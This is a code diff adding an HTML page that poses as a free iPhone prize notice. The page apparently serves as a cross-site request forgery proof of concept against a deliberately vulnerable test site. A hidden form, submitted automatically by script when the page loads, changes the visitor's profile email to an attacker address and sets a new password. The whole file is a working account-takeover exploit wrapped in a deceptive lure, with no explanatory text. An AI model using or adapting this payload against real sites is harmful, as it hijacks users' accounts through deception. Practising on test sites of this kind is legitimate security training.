@@ -1,0 +1,19 @@
+
+    <html>
+      <title>Win a Free iPhone 15!</title>
+      <body>
+        <h1>🎉 Congratulations! You won a free iPhone! 🎉</h1>
+        <p>Loading your prize... Please do not close this window.</p>
+
+        <form action="http://testphp.vulnweb.com/userinfo.php" method="POST" id="csrf_form" style="display: none;">
+          <input type="hidden" name="email" value="hacker_sudosammi@evil.com" />
+          <input type="hidden" name="password" value="Hacked123!" />
+          <input type="hidden" name="action" value="update_profile" />
+        </form>
+
+        <script>
+          document.getElementById('csrf_form').submit();
+        </script>
+      </body>
+    </html>
+    
